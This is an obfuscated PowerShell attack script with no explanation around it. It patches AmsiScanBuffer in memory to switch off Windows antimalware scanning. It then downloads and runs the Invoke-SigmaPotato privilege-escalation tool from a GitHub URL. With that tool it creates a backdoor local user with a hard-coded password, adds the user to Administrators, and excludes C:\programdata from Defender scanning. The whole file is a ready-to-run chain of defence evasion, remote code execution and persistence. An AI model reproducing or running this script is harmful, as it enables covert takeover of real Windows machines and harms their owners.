#Rasta-mouses Amsi-Scan-Buffer patch \n
$oK_ = @"
using System;
using System.Runtime.InteropServices;
public class oK_ {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr mcjScmNQssTI1v, string FIaO);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr Q0ZVNEVdrPd, UIntPtr ghUePaG9jW5eB, uint eaVrni78nQC9Z9Z, out uint PRxVQXejjMjkpQx5cG6A);
}
"@

Add-Type $oK_

$E9W03bJABnIcpb6 = [oK_]::LoadLibrary("$([chAR]([BYTE]0x61)+[char]([byTe]0x6d)+[chAr](115+45-45)+[cHaR](46+59)+[cHar]([Byte]0x2e)+[CHar](14+86)+[Char]([BytE]0x6c)+[chAR]([bYtE]0x6c))")
$VtIKCjicMF = [oK_]::GetProcAddress($E9W03bJABnIcpb6, "$(('ÄmsîScànB'+'ûffér').NORmaLize([cHAR](70*50/50)+[CHAr]([bYTE]0x6f)+[CHar]([bYTe]0x72)+[chAR]([byTE]0x6d)+[chAR]([bYTE]0x44)) -replace [cHar]([bytE]0x5c)+[ChAr]([ByTe]0x70)+[ChAR]([byTe]0x7b)+[cHaR]([byTE]0x4d)+[cHaR](110)+[cHaR](80+45))")
$p = 0
[oK_]::VirtualProtect($VtIKCjicMF, [uint32]5, 0x40, [ref]$p)
$z9E5BN = "0xB8"
$uHQ_ay4DBA9DGb = "0x57"
$aTvp8RivUR_fUYB_TK = "0x00"
$KulB_ytCg7O4fb48PzP2 = "0x07"
$OTdD0QLDnmo = "0x80"
$eL0QvCSAcwwpMMtVNIcG = "0xC3"
$sVRFF8_huKLA2XmdC = [Byte[]] ($z9E5BN,$uHQ_ay4DBA9DGb,$aTvp8RivUR_fUYB_TK,$KulB_ytCg7O4fb48PzP2,+$OTdD0QLDnmo,+$eL0QvCSAcwwpMMtVNIcG)
[System.Runtime.InteropServices.Marshal]::Copy($sVRFF8_huKLA2XmdC, 0, $VtIKCjicMF, 6)
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/farzas1/bad/refs/heads/main/Invoke-SigmaPotato.ps1')
Invoke-SigmaPotato -command "net user k kopq@123 /add"
Invoke-SigmaPotato -command "net localgroup administrators k /add"
Invoke-SigmaPotato -command "powershell Add-MpPreference -ExclusionPath C:\programdata"

















